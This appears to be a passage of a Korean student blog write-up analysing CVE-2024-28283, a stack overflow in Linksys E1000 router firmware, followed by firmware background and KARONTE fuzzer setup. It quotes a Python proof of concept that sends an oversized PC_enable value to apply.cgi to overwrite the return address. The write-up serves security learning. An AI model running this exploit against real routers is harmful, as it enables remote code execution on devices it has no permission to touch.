  &lt;li&gt;위와 같은 취약점이 CVE 등록되었다면, 필수적으로 E1000 router, httpd 키워드가 description에 있을 것이다&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;따라서 검색해 보았음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;CVE-2024-28283이 나왔고, 내부 description은 아래와 같았음&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;There is stack-based buffer overflow vulnerability in pc_change_act function in Linksys E1000 router firmware version v.2.1.03 and before, leading to remote code execution.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내용만 읽어보면, 매우 높은 확률로 해당 CVE가 문제 취약점일 가능성이 높음.&lt;/p&gt;

&lt;p&gt;더 확실한 교차 검증을 위해 과제로 주어진 파일 버전을 확인함&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%201.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정확히 일치하는 버전이기 때문에, 문제 취약점은 CVE-2024-28283인 것으로 가정하고 문제에 접근&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-cve-2024-28283-조사&quot;&gt;0.2. CVE-2024-28283 조사&lt;/h2&gt;

&lt;p&gt;NVD는 실제로 CVE가 등록되는 기관이 아니다.&lt;/p&gt;

&lt;p&gt;CNA가 운영규정에 따라 CVE를 등록하면 cve.org에 등록되는 형식이다. NVD는 이를 Pull 해서 NVD상에 넣고 관리하며 Assessment를 애초에 CVE가 CISA의 후원을 받고, NVD가 NIST에 의해 운영되며 NIST는 CISA와 함께 FISMA 집행을 위해 설립된 기관이므로, CVE와 NVD 둘 다 실질적으로 미 정부 산하기관으로 보면 되긴 하지만, 어쨌든 둘은 별개의 기관이다.&lt;/p&gt;

&lt;p&gt;즉, 더 정확하고 디테일한 정보를 보고 싶다면 cve.org에 올라온 CVE 정보를 보는 게 좋다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%202.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;저기 밑에 References로 나온 notion 페이지(&lt;a href=&quot;https://www.notion.so/37b98eec45ea4fc991b9b5bea3db091d?pvs=21&quot;&gt;https://d05004.notion.site/Linksys-E1000-BOF-37b98eec45ea4fc991b9b5bea3db091d&lt;/a&gt;)에 들어가면 해당 취약점 분석이 매우 상세하게 나와 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;03-취약점-분석-보고서-원본-정리&quot;&gt;0.3. 취약점 분석 보고서 원본 정리&lt;/h2&gt;

&lt;h3 id=&quot;031-취약점-원인&quot;&gt;0.3.1. 취약점 원인&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;원인은 BoF&lt;/li&gt;
  &lt;li&gt;BoF는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; 함수 사용으로 인해 발생(sprintf 함수가 BoF에 취약한 함수로, 시큐어코딩 규약을 위반한 셈)&lt;/li&gt;
  &lt;li&gt;해당 함수는 타겟 펌웨어의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt; 함수 내부에 있음&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;032-취약점-poc&quot;&gt;0.3.2. 취약점 PoC&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter target IP: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter session_id: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure_Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit_button&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GuestNetworkSetting&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gui_action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Apply&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;#dummy
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;#return address
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PC_enable&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;033-취약점-익스플로잇-결과&quot;&gt;0.3.3. 취약점 익스플로잇 결과&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RCE
    &lt;ul&gt;
      &lt;li&gt;웹 관리자 권한을 획득할 경우, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apply.cgi&lt;/code&gt; 인터페이스에 들어가는 POST 요청에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt; 파라미터를 삽입함으로써 RCE가 가능해짐&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-실-분석-수행&quot;&gt;1. 실 분석 수행&lt;/h1&gt;

&lt;p&gt;원데이라는 점을 주었고, 취약점 발생 포인트를 주었기 때문에 아마 당 접근 방법이 정석에 가까울 것이다.&lt;/p&gt;

&lt;p&gt;그러나 이전에 배운 점을 제대로 응용해 보고 싶었다.&lt;/p&gt;

&lt;p&gt;따라서 이 과제를 이전 과제와 연계해 더 고도화 수행하는 방법을 고민했다.&lt;/p&gt;

&lt;p&gt;저번주에 논문으로 알려준 KARONTE를 직접 이용해서 문제 바이너리의 취약점을 찾아내고, 정적 및 동적 분석까지 수행 후, 그에 대한 익스플로잇까지 완료하는 시나리오가 좋지 않을까?&lt;/p&gt;

&lt;p&gt;KARONTE 논문의 말미에는 해당 퍼저를 오픈소스로 공개했다는 말도 있으니(In the spirit of open science, we release the implementation of our prototype and a docker image to replicate our working environment.) 실현 가능한 과제 수행 방안이다.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ucsb-seclab/karonte&quot;&gt;https://github.com/ucsb-seclab/karonte&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;시간이 부족해 퍼저에서 결과를 얻는 것이 가능할지 모르겠으나, 최대한 진행해 본다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;10-karonte를-활용한-분석&quot;&gt;1.0. KARONTE를 활용한 분석&lt;/h2&gt;

&lt;h3 id=&quot;100-펌웨어-분석은-어떻게-시작해야-하는가&quot;&gt;1.0.0. 펌웨어 분석은 어떻게 시작해야 하는가?&lt;/h3&gt;

&lt;p&gt;펌웨어에 대해 분석을 해본 적은 없어서, 먼저 KARONTE 논문의 초입을 확인했다.&lt;/p&gt;

&lt;p&gt;‘Firmware Pre-Processing’ 과정에서 자동으로 binwalk 등의 툴로 펌웨어 이미지를 언패킹한다고 되어 있다.&lt;/p&gt;

&lt;p&gt;‘펌웨어 이미지 언패킹’ 이 정확히 어떤 input 파일을 넣어 어떤 output을 얻고, 그 과정에서 어떤 행위를 수행하는 것인지 모른다.&lt;/p&gt;

&lt;p&gt;따라서 ‘firmware image unpack bin’으로 검색했고, 아래와 같은 블로그 글을 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%203.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;출처: &lt;a href=&quot;https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file&quot;&gt;https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;펌웨어 분석을 하기 전 preprocessing이란 bin 확장자로 주어진 파일을 펌웨어 분석 툴을 활용해 unpack 진행할 경우, 파일시스템과 같은 unpacked된 결과물이 떨어지는 것으로 보인다.&lt;/p&gt;

&lt;p&gt;펌웨어는 하드웨어를 구동하기 위해 상당히 low-level에서 동작하도록 설계된 프로그램이다.&lt;/p&gt;

&lt;p&gt;그런 프로그램을 언패킹했을 때 파일시스템의 형태가 떨어진다는 건, 아마 하드웨어 인스트럭션-OS 중간 격의 동작도 겸하기 때문이 아닐까 추측된다. 아마 맞을 것 같다. 컴퓨터에서도 OS 부팅을 위해 CMOS라는 하드웨어 컴포넌트를 따로 두고 그 기반으로 에러커렉션 해서 BIOS가 돌아가니까&lt;/p&gt;

&lt;p&gt;이 추측이 맞는지 여부를 확인하기 위해 firmware architecture등의 키워드로 검색해 보았다.&lt;/p&gt;

&lt;p&gt;그 결과, 펌웨어는 아래와 같은 구조를 가진다고 한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%204.png&quot; alt=&quot;출처: [https://www.bytesnap.com/news-blog/firmware-explained-guide/](https://www.bytesnap.com/news-blog/firmware-explained-guide/)&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;출처: &lt;a href=&quot;https://www.bytesnap.com/news-blog/firmware-explained-guide/&quot;&gt;https://www.bytesnap.com/news-blog/firmware-explained-guide/&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bootloader: This immutable code runs first when a device powers on. It initialises core hardware like the CPU and memory, then &lt;strong&gt;loads the main firmware image from storage.&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;OS kernel: The kernel manages system resources and provides core services like multitasking and memory allocation. For small devices, it may be a real-time operating system (RTOS).&lt;/li&gt;
  &lt;li&gt;Device drivers: these enable the &lt;strong&gt;OS to communicate with hardware&lt;/strong&gt; like radios, sensors, and storage. They &lt;strong&gt;abstract&lt;/strong&gt; the hardware complexity into a common interface.&lt;/li&gt;
  &lt;li&gt;Middleware: Middleware provides connectivity, security, protocol stacks, and other &lt;strong&gt;services above the OS&lt;/strong&gt;. For example, a TCP/IP stack for network connectivity.&lt;/li&gt;
  &lt;li&gt;Application code: The main application firmware implements the &lt;strong&gt;device’s end-user functionality&lt;/strong&gt; – for example, user interfaces, algorithms, and network protocols.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;또한, 아래와 같은 특징을 가지고 있다 한다.(출처: &lt;a href=&quot;https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files&quot;&gt;https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files&lt;/a&gt; , chatgpt를 활용해 요약)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;✏️5-Bullet Summary:&lt;/strong&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Firmware File Composition:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;Firmware is stored as an Executable and Linkable File (ELF), &lt;strong&gt;often converted to binary (.bin)&lt;/strong&gt; or text-based binary (.hex), and represents the exact memory content written to the embedded flash.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Startup Process:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;On powering the board, the internal &lt;strong&gt;bootloader&lt;/strong&gt; redirects execution to the firmware’s entry point (usually at address 0x0). Startup code initializes the system (e.g., setting the clock, stack pointer, vector table, and memory sections).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Embedded vs. OS Control:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;Unlike operating systems, where user code relies on APIs and system libraries for low-level operations, &lt;strong&gt;embedded systems give full hardware and resource management control to user code.&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Firmware and OS Similarities:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;Both firmware and operating systems handle processors, memory, and I/O similarly, organizing code and data sections in memory during initialization.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Key Differences:&lt;/strong&gt;&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;Firmware uses &lt;strong&gt;physical RAM addressing&lt;/strong&gt; due to limited memory mapping in most microcontrollers.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Stack memory in firmware is explicitly managed by user code&lt;/strong&gt; via linker scripts, unlike OS-managed stacks in traditional programs.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;마지막으로, 펌웨어는 크게 3개 종류로 분류된다고 한다.(출처: &lt;a href=&quot;https://www.spiceworks.com/tech/devops/articles/what-is-firmware/&quot;&gt;https://www.spiceworks.com/tech/devops/articles/what-is-firmware/&lt;/a&gt;)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Low-level firmware&lt;/strong&gt;: These cannot be modified or altered since they are considered as integral hardware elements. They are stored on nonvolatile memory chips such as ROM and programmable ROM (PROM).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;High-level firmware&lt;/strong&gt;: These forms of firmware often have higher levels of instruction complexity than low-level firmware, bringing them closer to the realm of software than hardware. They are used in conjunction with flash memory chips to make upgrades possible.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Subsystem&lt;/strong&gt;: They are parts of a more extensive system that can work independently. It often looks like its device because the microcode for this firmware level is built into the central processing unit (CPU), the liquid crystal display units (LCD), and the flash chips. Also, it is like high-level firmware in terms of operation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;101-karonte-input-파인&quot;&gt;1.0.1. KARONTE input 파인&lt;/h3&gt;

&lt;p&gt;그런데, KARONTE에서는 binwalk등을 적용해 자동으로 펌웨어를 추출한다고 한다.&lt;/p&gt;

&lt;p&gt;즉 내가 문제로 받은 bin 파일을 그대로 input으로 주어도 될 것 같은데, 이게 맞는지 확실치 않다.&lt;/p&gt;

&lt;p&gt;따라서 이를 확실히 하기 위해 KARONTE의 레포를 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%205.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;되게 json_config_file을 보면 내가 넣어야 할 input 파일의 형태가 가늠될 것 같다.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;pickle_parsers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pickles/parser/NETGEAR/NETGEAR_analyzed_R6200v2-V10312_10111_fw__R6200v2-V10312_10111chkextracted_squashfs-root.pk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;stats&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data_keys&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;base_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;eg_source_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;fw_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/_R6200v2-V1.0.3.12_10.1.11.chk.extracted/squashfs-root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;angr_explode_bins&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;openvpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wpa_supplicant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
